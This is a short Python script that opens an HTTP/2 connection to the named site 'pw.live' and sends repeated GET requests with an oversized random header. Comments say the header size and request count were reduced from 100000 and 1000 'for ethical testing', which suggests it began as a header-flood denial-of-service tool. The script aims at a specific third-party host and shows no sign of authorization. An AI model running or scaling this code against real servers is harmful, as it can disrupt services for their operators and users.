import hyper
import string
import random
import time

# Target server details
TARGET = "pw.live"

# Generate a large header value with controlled size
def generate_large_header(size=10000):  # Reduced from 100000 to 10000 for safety
    """Generate a random string of specified size"""
    return ''.join(random.choices(string.ascii_letters, k=size))

def send_requests():
    try:
        # Establish an HTTP/2 connection with timeout
        conn = hyper.HTTP20Connection(TARGET, port=443, timeout=10)
        
        # Craft the request with reasonable headers
        headers = {
            ":method": "GET",
            ":scheme": "https",
            ":path": "/",
            "user-agent": "Mozilla/5.0",  # Standard header
            "X-Test-Header": generate_large_header(8000)  # Reduced size
        }

        # Send requests with delay to avoid overwhelming
        for i in range(10):  # Reduced from 1000 to 10 for ethical testing
            try:
                conn.request("GET", "/", headers=headers)
                print(f"Sent request {i+1}")
                time.sleep(0.5)  # Add delay between requests
            except Exception as e:
                print(f"Request failed: {str(e)}")
                break
                
    except Exception as e:
        print(f"Connection failed: {str(e)}")
    finally:
        if 'conn' in locals():
            conn.close()

if __name__ == "__main__":
    send_requests()
